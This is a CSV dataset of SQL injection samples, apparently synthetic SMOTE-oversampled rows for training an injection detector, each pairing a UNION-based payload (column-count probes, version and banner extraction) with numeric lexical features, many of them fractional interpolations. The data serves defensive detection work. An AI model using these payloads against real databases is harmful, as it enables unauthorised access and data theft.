id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001875,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000008,1.3252089013934127,53.19352757155037,20.367239252784728,3.8596676388064455,33.35733130762672,1.8361962639236467,12.816380373607636,5.183619626392365,0.6319530445455258,0.028249173291132967,0.24258459201107757,0.09721319015226365,0.0918098131961822,0.0,0.09180981319618242,0.0,0.9081901868038178,0.9081901868038178,0.0,0.09180981319618209,0.0,0.0,0.2754294395885464,1.908190186803818,0.0918098131961822,0.0,0.0,0.0918098131961822,0.0,0.9081901868038178,0.0918098131961822,0.0,0.0,0.0,0.0,1.0,1.0,0.9081901868038178,0.9081901868038178,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9081901868038178,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.724570560411453
SMOTE_001876,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000075,0.465756145101295,102.1963544141524,27.0,3.8615122822410055,25.0,43.06545147138413,20.598177207076198,13.532725735692065,0.24527303017370097,0.4216316241958657,0.2007669031880848,0.13232844244234854,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.7663628678460328,0.0,0.0,6.766362867846032,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001877,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,0.8229320474826121,86.43123576616381,26.4901765380234,4.0597842516974305,25.0,32.0,18.94105922814041,10.490176538023402,0.289721433178836,0.37084343446891005,0.2181001531026818,0.12133497924957218,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.4901765380234018,0.0,0.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001878,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,0.29675310961303897,74.36059097162898,23.327881805674206,4.0458151966643285,27.0,26.688472777303183,11.0,9.672118194325796,0.36408772802352823,0.35770083410475084,0.14833203734291892,0.12987940052880195,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,4.672118194325796,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001879,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000145,0.3669494424299352,92.99528607369095,26.800314261753936,3.9785406316709233,25.0,34.39622885895275,22.0,11.599057214738188,0.26985374054579114,0.36823401512673415,0.2374712916802962,0.12444095264717847,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,4.599057214738188,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001880,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,0.2580674453358339,80.96757137452805,27.0,4.124772204299733,29.0,25.57405709962244,15.0,11.393514274905609,0.3584901190685182,0.3154202528453134,0.1854259236561301,0.14066370443003837,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.39351427490561,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001881,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,0.18382453660735584,77.04959856572438,23.52672019123675,4.012236738635476,27.0,28.839678852579507,11.0,10.209919713144878,0.3532848557286647,0.3708243234111036,0.14393086714871525,0.13195995371151642,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,5.209919713144877,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001882,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000013,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001883,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000113,0.6410004660987167,106.6516791625809,27.668540104677387,4.0276698864973906,29.0,46.651679162580905,15.0,16.0,0.27224427406294244,0.43673598469736047,0.14081600382565987,0.15020373741403723,2.337080209354772,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.662919790645227,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001884,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000035,0.2692224372102775,102.078246017965,26.078246017965007,4.085239685027439,62.0,5.0,24.0,11.078246017965007,0.6073813770118188,0.048982369113856394,0.23511537174651054,0.10852088212781419,3.0,0.0,2.0,0.0,1.9217539820349923,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.078246017965007,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.07824601796500784,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001885,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000150,0.423937513782646,87.21826477962973,27.321826477962972,4.142055258445609,29.0,30.574611823703787,15.0,12.643652955925948,0.33341822712648655,0.34931053436695614,0.17245770368611374,0.1448135348204436,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.6436529559259467,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001886,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R000102,0.7646956495446122,115.0,27.54259701315473,4.128305543111558,32.08519402630946,48.91480597369054,15.771298506577365,18.228701493422637,0.2790016871852996,0.42534613890165685,0.137141726144151,0.15851044776889248,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.228701493422635,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.3856492532886822,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.385649253288682
SMOTE_001887,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,0.32042098594623225,88.96475503698089,26.0,3.9925953519891504,25.0,31.17180402958471,22.0,10.792951007396177,0.2818428636625979,0.3490514181398434,0.24802172002308615,0.1210839981744726,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.792951007396177,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001888,attack,union,"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",nearest_attack_euclidean,R000083,0.1777404761950324,106.28154569757203,26.871845430242796,4.145344986432221,29.0,45.02523655805763,15.0,17.256309139514407,0.27311264387332596,0.42329290500230904,0.1412651606241341,0.1623292905002309,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.256309139514407,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001889,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R000137,2.897329464306971,89.55528643580661,28.918590283784905,4.202427102820363,27.29647570946226,36.55528643580661,15.081409716215097,10.622114574322644,0.31013097326782807,0.40493936877553766,0.16786414676524652,0.11706551119138772,0.0,1.6889427128386778,2.311057287161322,0.0,0.0,1.0,0.0,0.770352429053774,0.0,0.0,4.851762145268871,3.311057287161322,0.0,1.0,0.770352429053774,0.0,0.0,1.0,0.770352429053774,0.0,0.0,0.0,0.0,1.0,1.0,0.770352429053774,0.0,0.229647570946226,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001890,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000150,0.6032382299041452,88.71721482580026,27.314480988386684,4.140869324707717,29.0,31.7737718606402,15.0,12.943442965160049,0.32878797138669946,0.35556936281522,0.17006274382070663,0.14557992197737388,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.9434429651600498,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001891,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000099,1.2525040802469936,44.951482596707784,21.0,4.057913385973063,14.0,19.161186077366228,4.0,7.790296519341556,0.3267258153006404,0.4079290216392315,0.0933502329430401,0.17199493011708797,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,2.790296519341557,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001892,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,0.22932085453167592,83.45067603796453,26.15493239620355,4.009998711471339,25.0,26.76054083037162,22.0,9.690135207592904,0.3001934273020999,0.31969051631664014,0.26417021602584795,0.11594584035541203,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.6901352075929053,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001893,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000091,0.172324673942034,107.74423752546114,26.0,3.9242654174881775,25.0,51.31796673456304,16.511524949077717,14.91474584182038,0.2320453317339922,0.4761587350977804,0.15338067849144754,0.1384152546767799,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0852541581796196,0.0,0.0,8.82949168364076,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001894,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000097,0.3246285540854319,87.17255348257136,28.0,4.195677530758125,29.0,29.738042786057086,15.0,13.434510696514272,0.3329406469288145,0.34077152147749734,0.1722106794459385,0.15407715214774975,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.434510696514272,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001895,attack,union,"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",nearest_attack_euclidean,R000083,0.21136400090735524,106.52397828442396,26.847602171557604,4.14160971540832,29.0,45.219182627539176,15.0,17.304795656884792,0.272530404120224,0.4240959943169324,0.14096400213115035,0.16240959943169325,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.304795656884794,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001896,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,0.28706547029342255,74.85861465489799,23.0,3.9547926250383485,27.0,27.08689172391839,11.0,9.771722930979598,0.3668928160934536,0.35429317156054524,0.14947485100103666,0.12933916134496448,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,4.771722930979598,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001897,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.220300193931012,43.75592180770739,18.248815638458524,3.8194845270150775,14.0,19.004737446165908,4.0,6.751184361541478,0.32078727482894254,0.43338597162406567,0.0916535070939836,0.1541732464530082,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,2.751184361541477,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001898,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000014,0.6875704355914227,109.60915674917251,26.845461861019167,4.02829268807416,63.690923722038335,5.845461861019167,28.22730930509584,11.845461861019167,0.5814084526761363,0.05327604010581988,0.2572483472124744,0.10806716000556947,3.0,0.0,2.0,0.0,1.1545381389808318,2.8454618610191678,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.8454618610191682,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.845461861019168
SMOTE_001899,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000077,0.3974188948023866,115.0,26.57833068735884,4.054988520860417,30.15666137471768,50.84333862528232,15.28916534367942,18.710834656320582,0.2622318380410233,0.4421159880459332,0.13294926385808192,0.16270291005496157,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.71083465632058,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.14458267183970974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.14458267183971
SMOTE_001900,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000148,0.22517775259973985,42.48477158180557,22.0,4.222502903393634,14.0,17.187817265444455,4.0,7.296954316361114,0.3304417804107752,0.40346986350706976,0.09441193726022148,0.17167641882193357,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,2.2969543163611137,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001901,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000095,1.2404246594268231,94.41283962048992,26.587160379510077,3.8858681174571736,25.0,36.0,22.0,11.412839620489923,0.26480168079370126,0.3813144203429298,0.23302547909845708,0.12085841976491193,0.0,0.4128396204899223,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,5.0,4.0,0.0,0.4128396204899223,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001902,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.619413139894208,75.84421874019272,33.53265622057817,4.447169023697574,42.62312503922911,2.8442187401927193,17.0,13.376874960770888,0.5620877747181261,0.03747859088316996,0.2241488213011796,0.17628481309752442,2.5326562205781658,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.8442187401927219,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001903,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R000102,0.09894664200827644,110.2289991135799,28.091599645431963,4.156618208064262,29.36639858172785,47.816800709136075,15.091599645431963,17.95420017728402,0.2662974600550392,0.4339016696089433,0.1368886145686812,0.16291225576733626,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.954200177284019,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.04579982271598132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.045799822715981
SMOTE_001904,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000154,1.0101875518064551,106.30658819771972,29.0,4.011372552788545,31.404791416523427,44.0,15.601197854130856,15.300598927065428,0.2944815583519027,0.41479391239144375,0.14668068097510495,0.14404384828154856,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,3.3005989270654283,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.30059892706542835,2.0,1.0,1.0,0.30059892706542835,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.300598927065428
SMOTE_001905,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000078,1.3709260968205395,111.5805641357094,28.5967606892849,4.01891505403768,33.77408551427919,45.6129572428604,16.1935213785698,16.0,0.3019627091948165,0.4095461585213509,0.14499608892543026,0.14349504335840235,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.403239310715101,3.596760689284899,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5967606892848989,2.0,1.0,1.0,0.5967606892848989,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.596760689284899
SMOTE_001906,attack,union," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",nearest_attack_euclidean,R000029,2.002679594034193,88.02556524767337,27.641031053737617,3.8959399557063925,45.79484473131191,2.358968946262383,27.871751570099065,12.0,0.5211585196623104,0.026548663773994674,0.31520509863698776,0.13708771792670718,0.0,0.3589689462623832,2.0,0.0,1.0,1.0,0.0,2.7179378925247666,0.0,0.0,1.0,5.282062107475234,0.0,0.3589689462623833,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.35896894626238335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.358968946262383
